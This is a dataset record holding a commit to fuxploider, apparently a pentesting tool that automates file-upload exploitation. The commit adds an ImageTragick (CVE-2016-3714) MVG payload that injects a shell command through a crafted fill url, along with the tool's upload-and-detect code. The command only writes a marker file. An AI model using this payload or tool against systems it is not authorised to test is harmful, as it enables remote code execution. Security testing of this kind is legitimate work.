:\n\targs.legitExtensions = [x.lower() for x in args.legitExtensions]\n\tfoundExt = [a[0] for a in extensions]\n\tfor b in args.legitExtensions :\n\t\tif b in foundExt :\n\t\t\ttmpLegitExt.append(b)\n\t\telse :\n\t\t\tlogging.warning(\"Extension %s can't be found as a valid/known extension with associated mime type.\",b)\nargs.legitExtensions = tmpLegitExt\n\npostData = postDataFromStringToJSON(args.data)\n\ns = requests.Session()\nif args.cookies :\n\tfor key in args.cookies.keys() :\n\t\ts.cookies[key] = args.cookies[key]\ns.headers = {'User-Agent':args.userAgent}\n##### PROXY HANDLING #####\ns.trust_env = False\nif args.proxy :\n\tif args.proxy[\"username\"] and args.proxy[\"password\"] and args.proxyCreds :\n\t\tlogging.warning(\"Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch\")\n\tif args.proxyCreds :\n\t\tproxyUser = args.proxyCreds[\"username\"]\n\t\tproxyPass = args.proxyCreds[\"password\"]\n\telse :\n\t\tproxyUser = args.proxy[\"username\"]\n\t\tproxyPass = args.proxy[\"password\"]\n\tproxyProtocol = args.proxy[\"protocol\"]\n\tproxyHostname = args.proxy[\"hostname\"]\n\tproxyPort = args.proxy[\"port\"]\n\tproxy = \"\"\n\tif proxyProtocol != None :\n\t\tproxy += proxyProtocol+\"://\"\n\telse :\n\t\tproxy += \"http://\"\n\n\tif proxyUser != None and proxyPass != None :\n\t\tproxy += proxyUser+\":\"+proxyPass+\"@\"\n\n\tproxy += proxyHostname\n\tif proxyPort != None :\n\t\tproxy += \":\"+proxyPort\n\n\tif proxyProtocol == \"https\" :\n\t\tproxies = {\"https\":proxy}\n\telse :\n\t\tproxies = {\"http\":proxy,\"https\":proxy}\n\n\ts.proxies.update(proxies)\n#########################################################\n\nif args.manualFormDetection:\n\tif args.formAction == \"\":\n\t\tlogger.warning(\"Using Manual Form Detection and no action specified with --form-action. Defaulting to empty string - meaning form action will be set to --url parameter.\")\n\tup = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath,args.url,args.formAction,args.inputName)\nelse:\n\tup = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath)\n\tup.setup(args.url)\nup.threads = args.nbThreads\n#########################################################\n\n############################################################\nuploadURL = up.uploadUrl\nfileInput = {\"name\":up.inputName}\n\n###### VALID EXTENSIONS DETECTION FOR THIS FORM ######\n\na = datetime.datetime.now()\n\nif not args.skipRecon :\n\tif len(args.legitExtensions) > 0 :\n\t\tn = up.detectValidExtensions(extensions,args.n,args.legitExtensions)\n\telse :\n\t\tn = up.detectValidExtensions(extensions,args.n)\n\tlogger.info(\"### Tried %s extensions, %s are valid.\",n,len(up.validExtensions))\nelse :\n\tlogger.info(\"### Skipping detection of valid extensions, using provided extensions instead (%s)\",args.legitExtensions)\n\tup.validExtensions = args.legitExtensions\n\nif up.validExtensions == [] :\n\tlogger.error(\"No valid extension found.\")\n\texit()\n\nb = datetime.datetime.now()\nprint(\"Extensions detection : \"+str(b-a))\n\n\n##############################################################################################################################################\n##############################################################################################################################################\ncont = input(\"Start uploading payloads ? [Y/n] : \")\nup.shouldLog = True\nif cont.lower().startswith(\"y\") or cont == \"\" :\n\tpass\nelse :\n\texit(\"Exiting.\")\n\nentryPoints = []\nup.stopThreads = True\n\nwith open(\"techniques.json\",\"r\") as rawTechniques :\n\ttechniques = json.loads(rawTechniques.read())\nlogger.info(\"### Starting code execution detection (messing with file extensions and mime types...)\")\nc = datetime.datetime.now()\nnbOfEntryPointsFound = 0\nattempts = []\ntemplatesData = {}\n\nfor template in templates :\n\ttemplatefd = open(templatesFolder+\"/\"+template[\"filename\"],\"rb\")\n\ttemplatesData[template[\"templateName\"]] = templatefd.read()\n\ttemplatefd.close()\n\tnastyExt = template[\"nastyExt\"]\n\tnastyMime = getMime(extensions,nastyExt)\n\tnastyExtVariants = template[\"extVariants\"]\n\tfor t in techniques :\n\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n\t\t\tfor legitExt in up.validExtensions :\n\t\t\t\tlegitMime = getMime(extensions,legitExt)\n\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})\n\n\nstopThreads = False\n\nattemptsTested = 0\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as executor :\n\tfutures = []\n\ttry :\n\t\tfor a in attempts :\n\t\t\tsuffix = a[\"suffix\"]\n\t\t\tmime = a[\"mime\"]\n\t\t\tpayload = templatesData[a[\"templateName\"]]\n\t\t\tcodeExecRegex = [t[\"codeExecRegex\"] for t in templates if t[\"templateName\"] == a[\"templateName\"]][0]\n\n\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)\n\t\t\tf.a = a\n\t\t\tfutures.append(f)\n\n\t\tfor future in concurrent.futures.as_completed(futures) :\n\t\t\tres = future.result()\n\t\t\tattemptsTested += 1\n\t\t\tif not stopThreads :\n\t\t\t\tif res[\"codeExec\"] :\n\n\t\t\t\t\tfoundEntryPoint = future.a\n\t\t\t\t\tlogging.info(\"\\033[1m\\033[42mCode execution obtained ('%s','%s','%s')\\033[m\",foundEntryPoint[\"suffix\"],foundEntryPoint[\"mime\"],foundEntryPoint[\"templateName\"])\n\t\t\t\t\tnbOfEntryPointsFound += 1\n\t\t\t\t\tentryPoints.append(foundEntryPoint)\n\n\t\t\t\t\tif not args.detectAllEntryPoints :\n\t\t\t\t\t\traise KeyboardInterrupt\n\n\texcept KeyboardInterrupt :\n\t\tstopThreads = True\n\t\texecutor.shutdown(wait=False)\n\t\texecutor._threads.clear()\n\t\tconcurrent.futures.thread._threads_queues.clear()\n\t\tlogger.setLevel(logging.CRITICAL)\n\t\tlogger.verbosity = -1\n\n\n################################################################################################################################################\n################################################################################################################################################\nd = datetime.datetime.now()\n#print(\"Code exec detection : \"+str(d-c))\nprint()\nlogging.info(\"%s entry point(s) found using %s HTTP requests.\",nbOfEntryPointsFound,up.httpRequests)\nprint(\"Found the following entry points : \")\nprint(entryPoints)"}}, "msg": "Added detection of vulnerable ImageMagick\n\nAdded a new template named \"imagetragick\" that detects if the file\nupload is vulnerable to CVE-2016-3714, which is a Remote Code Execution\nvulnerability in the ImageMagick software. By uploading a crafted file\nit is possible to run arbitrary commands on the server if vulnerable.\nThe command performed by the template on vulnerable servers creates a\nfile with the text \"ImageTragick Detected!\" in the same directory as the\nupload form page.\n\nSince no malicious extension is needed for the exploitation of this\nvulnerability, support has been added for templates without \"nasty\"\nextensions. This vulnerability can be exploited by uploading a variety\nof image filetypes (png, jpg etc.), so all legitimate filetypes\nsupported by the file upload in the server will be tried.\n\nTested against a docker machine running a vulnerable instance of\nImageMagick. For testing, created a variant of a docker machine created\nby the chinese VulApps: http://vulapps.evalbug.com/i_imagemagick_1/\nThe docker variant used for testing can be found by running:\n- docker pull madhatter37/vulnerable_apps:imagemagick_1.0.2\n- docker run -d -p 80:80 madhatter37/vulnerable_apps:imagemagick_1.0.2\n- ./fuxploider.py --uploads-path uploads -u http://127.0.0.1/file_upload/poc.php --not-regex \"your file was not uploaded\" --true-regex \"has been uploaded to\" --data \"submit=Submit\" --template=imagetragick"}}, "https://github.com/almandin/fuxploider": {"3ba30040d60a72fcf1a831635fa2ce43bc857073": {"url": "https://api.github.com/repos/almandin/fuxploider/commits/3ba30040d60a72fcf1a831635fa2ce43bc857073", "html_url": "https://github.com/almandin/fuxploider/commit/3ba30040d60a72fcf1a831635fa2ce43bc857073", "message": "Added detection of vulnerable ImageMagick\n\nAdded a new template named \"imagetragick\" that detects if the file\nupload is vulnerable to CVE-2016-3714, which is a Remote Code Execution\nvulnerability in the ImageMagick software. By uploading a crafted file\nit is possible to run arbitrary commands on the server if vulnerable.\nThe command performed by the template on vulnerable servers creates a\nfile with the text \"ImageTragick Detected!\" in the same directory as the\nupload form page.\n\nSince no malicious extension is needed for the exploitation of this\nvulnerability, support has been added for templates without \"nasty\"\nextensions. This vulnerability can be exploited by uploading a variety\nof image filetypes (png, jpg etc.), so all legitimate filetypes\nsupported by the file upload in the server will be tried.\n\nTested against a docker machine running a vulnerable instance of\nImageMagick. For testing, created a variant of a docker machine created\nby the chinese VulApps: http://vulapps.evalbug.com/i_imagemagick_1/\nThe docker variant used for testing can be found by running:\n- docker pull madhatter37/vulnerable_apps:imagemagick_1.0.2\n- docker run -d -p 80:80 madhatter37/vulnerable_apps:imagemagick_1.0.2\n- ./fuxploider.py --uploads-path uploads -u http://127.0.0.1/file_upload/poc.php --not-regex \"your file was not uploaded\" --true-regex \"has been uploaded to\" --data \"submit=Submit\" --template=imagetragick", "sha": "3ba30040d60a72fcf1a831635fa2ce43bc857073", "keyword": "remote code execution malicious", "diff": "diff --git a/UploadForm.py b/UploadForm.py\nindex 0de5e0c..8ad36d8 100644\n--- a/UploadForm.py\n+++ b/UploadForm.py\n@@ -85,12 +85,15 @@ def setup(self,initUrl) :\n \t\t\tpass#uploads folder provided\n \n \t#tries to upload a file through the file upload form\n-\tdef uploadFile(self,suffix,mime,payload) :\n+\tdef uploadFile(self,suffix,mime,payload,dynamicPayload=False) :\n \t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd :\n+\t\t\tfilename = os.path.basename(fd.name)\n+\t\t\tfilename_wo_ext = filename.split('.', 1)[0]\n+\t\t\tif dynamicPayload:\n+\t\t\t\tpayload = payload.replace(b\"$filename$\",bytearray(filename_wo_ext,'ascii'))\n \t\t\tfd.write(payload)\n \t\t\tfd.flush()\n \t\t\tfd.seek(0)\n-\t\t\tfilename = os.path.basename(fd.name)\n \t\t\tif self.shouldLog :\n \t\t\t\tself.logger.debug(\"Sending file %s with mime type : %s\",filename,mime)\n \t\t\tfu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)\n@@ -101,7 +104,7 @@ def uploadFile(self,suffix,mime,payload) :\n \t\t\t\tif self.logger.verbosity > 2 :\n \t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\")\n \t\t\t\n-\t\treturn (fu,filename)\n+\t\treturn (fu,filename,filename_wo_ext)\n \n \t#detects if a given html code represents an upload success or not\n \tdef isASuccessfulUpload(self,html) :\n@@ -198,8 +201,8 @@ def detectCodeExec(self,url,regex) :\n \n \t#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect\n \t#\tif code execution is gained through the uploaded file\n-\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n-\t\tfu = self.uploadFile(suffix,mime,payload)\n+\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None,codeExecURL=None,dynamicPayload=False) :\n+\t\tfu = self.uploadFile(suffix,mime,payload,dynamicPayload)\n \t\tuploadRes = self.isASuccessfulUpload(fu[0].text)\n \t\tresult = {\"uploaded\":False,\"codeExec\":False}\n \t\tif uploadRes :\n@@ -215,7 +218,11 @@ def submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n \t\t\t\turl = None\n \t\t\t\tsecondUrl = None\n \t\t\t\tif self.uploadsFolder :\n-\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n+\t\t\t\t\tif codeExecURL:\n+\t\t\t\t\t\tfilename_wo_ext = fu[2]\n+\t\t\t\t\t\turl = codeExecURL.replace(\"$uploadFormDir$\",os.path.dirname(self.uploadUrl)).replace(\"$filename$\",filename_wo_ext)\n+\t\t\t\t\telse:\n+\t\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n \t\t\t\t\tfilename = fu[1]\n \t\t\t\t\tsecondUrl = None\n \t\t\t\t\tfor b in getPoisoningBytes() :\ndiff --git a/fuxploider.py b/fuxploider.py\nindex 3324960..47634a9 100755\n--- a/fuxploider.py\n+++ b/fuxploider.py\n@@ -257,16 +257,24 @@\n \ttemplatefd = open(templatesFolder+\"/\"+template[\"filename\"],\"rb\")\n \ttemplatesData[template[\"templateName\"]] = templatefd.read()\n \ttemplatefd.close()\n-\tnastyExt = template[\"nastyExt\"]\n-\tnastyMime = getMime(extensions,nastyExt)\n-\tnastyExtVariants = template[\"extVariants\"]\n-\tfor t in techniques :\n-\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n-\t\t\tfor legitExt in up.validExtensions :\n-\t\t\t\tlegitMime = getMime(extensions,legitExt)\n-\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n-\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n-\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})\n+\tnastyExt = template.get(\"nastyExt\")\n+\tnastyMime = None if nastyExt == None else getMime(extensions,nastyExt)\n+\tnastyExtVariants = template.get(\"extVariants\")\n+\tcodeExecURL = template.get(\"codeExecURL\")\n+\tdynamicPayload = template.get(\"dynamicPayload\")\n+\tfor legitExt in up.validExtensions:\n+\t\tlegitMime = getMime(extensions, legitExt)\n+\t\tif nastyExt == None:\n+\t\t\tattempts.append({\"suffix\": \".\"+legitExt, \"mime\": legitMime, \"templateName\": template[\"templateName\"],\n+\t\t\t\t\t\t\t \"codeExecURL\": codeExecURL, \"dynamicPayload\": dynamicPayload})\n+\t\telse:\n+\t\t\tfor t in techniques :\n+\t\t\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n+\t\t\t\t\tlegitMime = getMime(extensions,legitExt)\n+\t\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n+\t\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n+\t\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"],\n+\t\t\t\t\t\t\t\t\t \"codeExecURL\":codeExecURL,\"dynamicPayload\":dynamicPayload})\n \n \n stopThreads = False\n@@ -281,8 +289,10 @@\n \t\t\tmime = a[\"mime\"]\n \t\t\tpayload = templatesData[a[\"templateName\"]]\n \t\t\tcodeExecRegex = [t[\"codeExecRegex\"] for t in templates if t[\"templateName\"] == a[\"templateName\"]][0]\n+\t\t\tcodeExecURL = a[\"codeExecURL\"]\n+\t\t\tdynamicPayload = a[\"dynamicPayload\"]\n \n-\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)\n+\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex,codeExecURL,dynamicPayload)\n \t\t\tf.a = a\n \t\t\tfutures.append(f)\n \ndiff --git a/payloads/imagemagick_rce.mvg b/payloads/imagemagick_rce.mvg\nnew file mode 100644\nindex 0000000..7262940\n--- /dev/null\n+++ b/payloads/imagemagick_rce.mvg\n@@ -0,0 +1,4 @@\n+push graphic-context\n+viewbox 0 0 640 480\n+fill 'url(https://example.com/image.jpg\"|echo ImageTragick Detected! > \"$filename$.txt)'\n+pop graphic-context\ndiff --git a/templates.json b/templates.json\nindex 76b6870..07b0950 100644\n--- a/templates.json\n+++ b/templates.json\n@@ -28,5 +28,13 @@\n \t\t\"nastyExt\":\"jsp\",\n \t\t\"codeExecRegex\":\"12\",\n \t\t\"extVariants\":[\"JSP\",\"jSp\"]\n+\t},\n+\t{\n+\t\t\"templateName\" : \"imagetragick\",\n+\t\t\"description\" : \"Attempts to exploit RCE in ImageMagick (CVE-2016\u20133714)\",\n+\t\t\"filename\":\"imagemagick_rce.mvg\",\n+\t\t\"codeExecRegex\":\"ImageTragick Detected!\",\n+\t\t\"codeExecURL\":\"$uploadFormDir$/$filename$.txt\",\n+\t\t\"dynamicPayload\":\"True\"\n \t}\n ]\n", "files": {"/UploadForm.py": {"changes": [{"diff": "\n \t\t\tpass#uploads folder provided\n \n \t#tries to upload a file through the file upload form\n-\tdef uploadFile(self,suffix,mime,payload) :\n+\tdef uploadFile(self,suffix,mime,payload,dynamicPayload=False) :\n \t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd :\n+\t\t\tfilename = os.path.basename(fd.name)\n+\t\t\tfilename_wo_ext = filename.split('.', 1)[0]\n+\t\t\tif dynamicPayload:\n+\t\t\t\tpayload = payload.replace(b\"$filename$\",bytearray(filename_wo_ext,'ascii'))\n \t\t\tfd.write(payload)\n \t\t\tfd.flush()\n \t\t\tfd.seek(0)\n-\t\t\tfilename = os.path.basename(fd.name)\n \t\t\tif self.shouldLog :\n \t\t\t\tself.logger.debug(\"Sending file %s with mime type : %s\",filename,mime)\n \t\t\tfu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)\n", "add": 5, "remove": 2, "filename": "/UploadForm.py", "badparts": ["\tdef uploadFile(self,suffix,mime,payload) :", "\t\t\tfilename = os.path.basename(fd.name)"], "goodparts": ["\tdef uploadFile(self,suffix,mime,payload,dynamicPayload=False) :", "\t\t\tfilename = os.path.basename(fd.name)", "\t\t\tfilename_wo_ext = filename.split('.', 1)[0]", "\t\t\tif dynamicPayload:", "\t\t\t\tpayload = payload.replace(b\"$filename$\",bytearray(filename_wo_ext,'ascii'))"]}, {"diff": "\n \t\t\t\tif self.logger.verbosity > 2 :\n \t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\")\n \t\t\t\n-\t\treturn (fu,filename)\n+\t\treturn (fu,filename,filename_wo_ext)\n \n \t#detects if a given html code represents an upload success or not\n \tdef isASuccessfulUpload(self,html) :\n", "add": 1, "remove": 1, "filename": "/UploadForm.py", "badparts": ["\t\treturn (fu,filename)"], "goodparts": ["\t\treturn (fu,filename,filename_wo_ext)"]}, {"diff": "\n \n \t#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect\n \t#\tif code execution is gained through the uploaded file\n-\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n-\t\tfu = self.uploadFile(suffix,mime,payload)\n+\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None,codeExecURL=None,dynamicPayload=False) :\n+\t\tfu = self.uploadFile(suffix,mime,payload,dynamicPayload)\n \t\tuploadRes = self.isASuccessfulUpload(fu[0].text)\n \t\tresult = {\"uploaded\":False,\"codeExec\":False}\n \t\tif uploadRes :\n", "add": 2, "remove": 2, "filename": "/UploadForm.py", "badparts": ["\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :", "\t\tfu = self.uploadFile(suffix,mime,payload)"], "goodparts": ["\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None,codeExecURL=None,dynamicPayload=False) :", "\t\tfu = self.uploadFile(suffix,mime,payload,dynamicPayload)"]}, {"diff": "\n \t\t\t\turl = None\n \t\t\t\tsecondUrl = None\n \t\t\t\tif self.uploadsFolder :\n-\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n+\t\t\t\t\tif codeExecURL:\n+\t\t\t\t\t\tfilename_wo_ext = fu[2]\n+\t\t\t\t\t\turl = codeExecURL.replace(\"$uploadFormDir$\",os.path.dirname(self.uploadUrl)).replace(\"$filename$\",filename_wo_ext)\n+\t\t\t\t\telse:\n+\t\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n \t\t\t\t\tfilename = fu[1]\n \t\t\t\t\tsecondUrl = None\n \t\t\t\t\tfor b in getPoisoningBytes() :", "add": 5, "remove": 1, "filename": "/UploadForm.py", "badparts": ["\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]"], "goodparts": ["\t\t\t\t\tif codeExecURL:", "\t\t\t\t\t\tfilename_wo_ext = fu[2]", "\t\t\t\t\t\turl = codeExecURL.replace(\"$uploadFormDir$\",os.path.dirname(self.uploadUrl)).replace(\"$filename$\",filename_wo_ext)", "\t\t\t\t\telse:", "\t\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]"]}], "source": "\nimport logging,concurrent.futures from utils import * from urllib.parse import urljoin,urlparse from threading import Lock class UploadForm: \tdef __init__(self,notRegex,trueRegex,session,size,postData,uploadsFolder=None,formUrl=None,formAction=None,inputName=None): \t\tself.logger=logging.getLogger(\"fuxploider\") \t\tself.postData=postData \t\tself.formUrl=formUrl \t\turl=urlparse(self.formUrl) \t\tself.schema=url.scheme \t\tself.host=url.netloc \t\tself.uploadUrl=urljoin(formUrl, formAction) \t\tself.session=session \t\tself.trueRegex=trueRegex \t\tself.notRegex=notRegex \t\tself.inputName=inputName \t\tself.uploadsFolder=uploadsFolder \t\tself.size=size \t\tself.validExtensions=[] \t\tself.httpRequests=0 \t\tself.codeExecUrlPattern=None \t\tself.logLock=Lock() \t\tself.stopThreads=False \t\tself.shouldLog=True \t \tdef setup(self,initUrl): \t\tself.formUrl=initUrl \t\turl=urlparse(self.formUrl) \t\tself.schema=url.scheme \t\tself.host=url.netloc \t\tself.httpRequests=0 \t\ttry: \t\t\tinitGet=self.session.get(self.formUrl,headers={\"Accept-Encoding\":None}) \t\t\tself.httpRequests +=1 \t\t\tif self.logger.verbosity > 1: \t\t\t\tprintSimpleResponseObject(initGet) \t\t\tif self.logger.verbosity > 2: \t\t\t\tprint(\"\\033[36m\"+initGet.text+\"\\033[m\") \t\t\tif initGet.status_code < 200 or initGet.status_code > 300: \t\t\t\tself.logger.critical(\"Server responded with following status: %s -%s\",initGet.status_code,initGet.reason) \t\t\t\texit() \t\texcept Exception as e: \t\t\t\tself.logger.critical(\"%s: Host unreachable(%s)\",getHost(initUrl),e) \t\t\t\texit() \t\t \t\tdetectedForms=detectForms(initGet.text) \t\tif len(detectedForms)==0: \t\t\tself.logger.critical(\"No HTML form found here\") \t\t\texit() \t\tif len(detectedForms) > 1: \t\t\tself.logger.critical(\"%s forms found containing file upload inputs, no way to choose which one to test.\",len(detectedForms)) \t\t\texit() \t\tif len(detectedForms[0][1]) > 1: \t\t\tself.logger.critical(\"%s file inputs found inside the same form, no way to choose which one to test.\",len(detectedForms[0])) \t\t\texit() \t\tself.inputName=detectedForms[0][1][0][\"name\"] \t\tself.logger.debug(\"Found the following file upload input: %s\",self.inputName) \t\tformDestination=detectedForms[0][0] \t\ttry: \t\t\tself.action=formDestination[\"action\"] \t\texcept: \t\t\tself.action=\"\" \t\tself.uploadUrl=urljoin(self.formUrl,self.action) \t\tself.logger.debug(\"Using following URL for file upload: %s\",self.uploadUrl) \t\tif not self.uploadsFolder and not self.trueRegex: \t\t\tself.logger.warning(\"No uploads folder nor true regex defined, code execution detection will not be possible.\") \t\telif not self.uploadsFolder and self.trueRegex: \t\t\tprint(\"No uploads path provided, code detection can still be done using true regex capturing group.\") \t\t\tcont=input(\"Do you want to use the True Regex for code execution detection ?[Y/n] \") \t\t\tif cont.lower().startswith(\"y\") or cont==\"\": \t\t\t\tpreffixPattern=input(\"Preffix capturing group of the true regex with: \") \t\t\t\tsuffixPattern=input(\"Suffix capturing group of the true regex with: \") \t\t\t\tself.codeExecUrlPattern=preffixPattern+\"$captGroup$\"+suffixPattern \t\t\telse: \t\t\t\tself.logger.warning(\"Code execution detection will not be possible as there is no path nor regex pattern configured.\") \t\telse: \t\t\tpass \t \tdef uploadFile(self,suffix,mime,payload): \t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd: \t\t\tfd.write(payload) \t\t\tfd.flush() \t\t\tfd.seek(0) \t\t\tfilename=os.path.basename(fd.name) \t\t\tif self.shouldLog: \t\t\t\tself.logger.debug(\"Sending file %s with mime type: %s\",filename,mime) \t\t\tfu=self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData) \t\t\tself.httpRequests +=1 \t\t\tif self.shouldLog: \t\t\t\tif self.logger.verbosity > 1: \t\t\t\t\tprintSimpleResponseObject(fu) \t\t\t\tif self.logger.verbosity > 2: \t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\") \t\t\t \t\treturn(fu,filename) \t \tdef isASuccessfulUpload(self,html): \t\tresult=False \t\tvalidExt=False \t\tif self.notRegex: \t\t\tfileUploaded=re.search(self.notRegex,html) \t\t\tif fileUploaded==None: \t\t\t\tresult=True \t\t\t\tif self.trueRegex: \t\t\t\t\tmoreInfo=re.search(self.trueRegex,html) \t\t\t\t\tif moreInfo: \t\t\t\t\t\tresult=str(moreInfo.groups()) \t\tif self.trueRegex and not result: \t\t\tfileUploaded=re.search(self.trueRegex,html) \t\t\tif fileUploaded: \t\t\t\ttry: \t\t\t\t\tresult=str(fileUploaded.group(1)) \t\t\t\texcept: \t\t\t\t\tresult=str(fileUploaded.group(0)) \t\treturn result \t \tdef detectValidExtension(self, future): \t\tif not self.stopThreads: \t\t\thtml=future.result()[0].text \t\t\text=future.ext[0] \t\t\tr=self.isASuccessfulUpload(html) \t\t\tif r: \t\t\t\tself.validExtensions.append(ext) \t\t\t\tif self.shouldLog: \t\t\t\t\tself.logger.info(\"\\033[1m\\033[42mExtension %s seems valid for this form.\\033[m\", ext) \t\t\t\t\tif r !=True: \t\t\t\t\t\tself.logger.info(\"\\033[1;32mTrue regex matched the following information: %s\\033[m\",r) \t\t\treturn r \t\telse: \t\t\treturn None \t \tdef detectValidExtensions(self,extensions,maxN,extList=None): \t\tself.logger.info(\" \t\tn=0 \t\tif extList: \t\t\ttmpExtList=[] \t\t\tfor e in extList: \t\t\t\ttmpExtList.append((e,getMime(extensions,e))) \t\telse: \t\t\ttmpExtList=extensions \t\tvalidExtensions=[] \t\textensionsToTest=tmpExtList[0:maxN] \t\twith concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor: \t\t\tfutures=[] \t\t\ttry: \t\t\t\tfor ext in extensionsToTest: \t\t\t\t\tf=executor.submit(self.uploadFile,\".\"+ext[0],ext[1],os.urandom(self.size)) \t\t\t\t\tf.ext=ext \t\t\t\t\tf.add_done_callback(self.detectValidExtension) \t\t\t\t\tfutures.append(f) \t\t\t\tfor future in concurrent.futures.as_completed(futures): \t\t\t\t\ta=future.result() \t\t\t\t\tn +=1 \t\t\texcept KeyboardInterrupt: \t\t\t\tself.shouldLog=False \t\t\t\texecutor.shutdown(wait=False) \t\t\t\tself.stopThreads=True \t\t\t\texecutor._threads.clear() \t\t\t\tconcurrent.futures.thread._threads_queues.clear() \t\treturn n \t \tdef detectCodeExec(self,url,regex): \t\tif self.shouldLog: \t\t\tif self.logger.verbosity > 0: \t\t\t\tself.logger.debug(\"Requesting %s...\",url) \t\t \t\tr=self.session.get(url) \t\tif self.shouldLog: \t\t\tif r.status_code >=400: \t\t\t\tself.logger.warning(\"Code exec detection returned an http code of %s.\",r.status_code) \t\t\tself.httpRequests +=1 \t\t\tif self.logger.verbosity > 1: \t\t\t\tprintSimpleResponseObject(r) \t\t\tif self.logger.verbosity > 2: \t\t\t\tprint(\"\\033[36m\"+r.text+\"\\033[m\") \t\tres=re.search(regex,r.text) \t\tif res: \t\t\treturn True \t\telse: \t\t\treturn False \t \t \tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None): \t\tfu=self.uploadFile(suffix,mime,payload) \t\tuploadRes=self.isASuccessfulUpload(fu[0].text) \t\tresult={\"uploaded\":False,\"codeExec\":False} \t\tif uploadRes: \t\t\tresult[\"uploaded\"]=True \t\t\tif self.shouldLog: \t\t\t\tself.logger.info(\"\\033[1;32mUpload of '%s' with mime type %s successful\\033[m\",fu[1], mime) \t\t\t \t\t\tif uploadRes !=True: \t\t\t\tif self.shouldLog: \t\t\t\t\tself.logger.info(\"\\033[1;32m\\tTrue regex matched the following information: %s\\033[m\",uploadRes) \t\t\tif codeExecRegex and valid_regex(codeExecRegex) and(self.uploadsFolder or self.trueRegex): \t\t\t\turl=None \t\t\t\tsecondUrl=None \t\t\t\tif self.uploadsFolder: \t\t\t\t\turl=self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1] \t\t\t\t\tfilename=fu[1] \t\t\t\t\tsecondUrl=None \t\t\t\t\tfor b in getPoisoningBytes(): \t\t\t\t\t\tif b in filename: \t\t\t\t\t\t\tsecondUrl=b.join(url.split(b)[:-1]) \t\t\t\telif self.codeExecUrlPattern: \t\t\t\t\t \t\t\t\t\turl=self.codeExecUrlPattern.replace(\"$captGroup$\",uploadRes) \t\t\t\telse: \t\t\t\t\tpass \t\t\t\t\t \t\t\t\tif url: \t\t\t\t\texecutedCode=self.detectCodeExec(url,codeExecRegex) \t\t\t\t\tif executedCode: \t\t\t\t\t\tresult[\"codeExec\"]=True \t\t\t\tif secondUrl: \t\t\t\t\texecutedCode=self.detectCodeExec(secondUrl,codeExecRegex) \t\t\t\t\tif executedCode: \t\t\t\t\t\tresult[\"codeExec\"]=True \t\treturn result \t \tdef detectForms(html): \t\tsoup=BeautifulSoup(html,'html.parser') \t\tdetectedForms=soup.find_all(\"form\") \t\treturnForms=[] \t\tif len(detectedForms) > 0: \t\t\tfor f in detectedForms: \t\t\t\tfileInputs=f.findChildren(\"input\",{\"type\":\"file\"}) \t\t\t\tif len(fileInputs) > 0: \t\t\t\t\treturnForms.append((f,fileInputs)) \t\treturn returnForms ", "sourceWithComments": "import logging,concurrent.futures\nfrom utils import *\nfrom urllib.parse import urljoin,urlparse\nfrom threading import Lock\n\nclass UploadForm :\n\tdef __init__(self,notRegex,trueRegex,session,size,postData,uploadsFolder=None,formUrl=None,formAction=None,inputName=None) :\n\t\tself.logger = logging.getLogger(\"fuxploider\")\n\t\tself.postData 